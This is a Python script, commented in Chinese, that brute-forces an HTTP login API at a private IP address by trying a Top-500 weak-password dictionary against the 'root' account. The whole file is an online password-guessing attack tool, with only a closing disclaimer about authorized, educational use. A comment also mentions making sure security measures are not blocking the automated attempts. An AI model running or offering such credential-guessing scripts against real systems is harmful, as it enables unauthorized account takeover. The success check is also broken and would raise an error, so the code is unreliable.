import requests

LOGIN_URL = "http://172.16.0.101/api/login" 
USERNAME = "root" 
PASSWORD_FILE = r"弱口令字典\passwd-keyboard-Top500.txt" 

def try_login(username, password):
    data = {
        "username": username,
        "password": password,
        "type": 2
    }
    try:
        response = requests.post(LOGIN_URL, data=data)
        if response.status_code == 200 in response.text:
            return True
        return False
    except requests.RequestException as e:
        print(f"请求失败：{e}")
        return False

def main():
    with open(PASSWORD_FILE, "r", encoding="utf-8") as f:
        for line in f:
            password = line.strip()
            print(f"尝试密码: {password}")
            if try_login(USERNAME, password):
                print(f"✅ 弱口令发现: {password}")
                break
        else:
            print("❌ 未发现弱口令")

if __name__ == "__main__":
    main()

# 代码完成
# 注意：请确保在合法授权的情况下使用此脚本，未经授权的测试可能违反法律法规。
# 该脚本仅用于教育和研究目的，使用前请确保遵守相关法律法规和道德规范。
# 如果你在使用过程中遇到问题，请检查网络连接、URL是否正确以及密码字典文件的路径是否正确。
# 另外，确保目标网站的登录接口没有防火墙或其他安全措施阻止自动化登录请求。
# 最后，建议在测试前备份重要数据，以防止意外情况发生。
# 该脚本使用requests库进行HTTP请求，请确保已安装requests库。    